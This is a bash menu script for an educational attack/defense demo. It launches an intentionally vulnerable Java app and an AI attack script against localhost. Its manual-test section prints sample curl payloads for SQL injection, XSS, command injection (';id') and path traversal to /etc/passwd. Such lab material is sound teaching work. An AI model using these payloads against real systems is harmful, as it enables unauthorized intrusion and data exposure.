#!/bin/bash

echo "============================================================"
echo "   AI-POWERED ATTACK/DEFENSE SECURITY DEMO"
echo "   FOR EDUCATIONAL PURPOSES ONLY"
echo "============================================================"
echo ""

show_menu() {
    echo "Select an option:"
    echo ""
    echo "[1] Start Vulnerable Application (Java)"
    echo "[2] Run AI Attack System (Python)"
    echo "[3] Manual Attack Tests (curl commands)"
    echo "[4] View Security Report"
    echo "[5] Exit"
    echo ""
}

start_app() {
    echo ""
    echo "Starting Vulnerable Application..."
    echo "Navigate to http://localhost:8080 in your browser"
    echo "Press Ctrl+C to stop the application"
    echo ""
    cd vulnerable-app
    mvn spring-boot:run
}

run_attack() {
    echo ""
    echo "Running AI Attack System..."
    echo "Make sure the vulnerable app is running first!"
    echo ""
    cd ai-attack-system

    if [ ! -d "venv" ]; then
        echo "Creating virtual environment..."
        python3 -m venv venv
    fi

    source venv/bin/activate
    pip install -r requirements.txt -q
    python ai_attacker.py --target http://localhost:8080 --output security_report.txt
    echo ""
    echo "Report saved to: ai-attack-system/security_report.txt"
    read -p "Press Enter to continue..."
}

manual_tests() {
    echo ""
    echo "============================================================"
    echo "   MANUAL ATTACK TESTS"
    echo "============================================================"
    echo ""
    echo "1. SQL Injection Test:"
    echo "   curl \"http://localhost:8080/api/users/search?username=' OR '1'='1' --\""
    echo ""
    echo "2. XSS Test:"
    echo "   curl -X POST \"http://localhost:8080/api/comments?author=Test&comment=<script>alert('XSS')</script>\""
    echo ""
    echo "3. Command Injection Test (Linux):"
    echo "   curl \"http://localhost:8080/api/ping?host=127.0.0.1;id\""
    echo ""
    echo "4. Path Traversal Test:"
    echo "   curl \"http://localhost:8080/api/files?filename=../../../../../etc/passwd\""
    echo ""
    read -p "Press Enter to continue..."
}

view_report() {
    echo ""
    if [ -f "ai-attack-system/security_report.txt" ]; then
        less ai-attack-system/security_report.txt
    else
        echo "No report found. Run the AI Attack System first."
        read -p "Press Enter to continue..."
    fi
}

while true; do
    show_menu
    read -p "Enter your choice (1-5): " choice

    case $choice in
        1) start_app ;;
        2) run_attack ;;
        3) manual_tests ;;
        4) view_report ;;
        5) echo ""; echo "Thank you for using the Security Demo!"; echo "Remember: Only test systems you have permission to test!"; exit 0 ;;
        *) echo "Invalid choice. Please try again." ;;
    esac
done
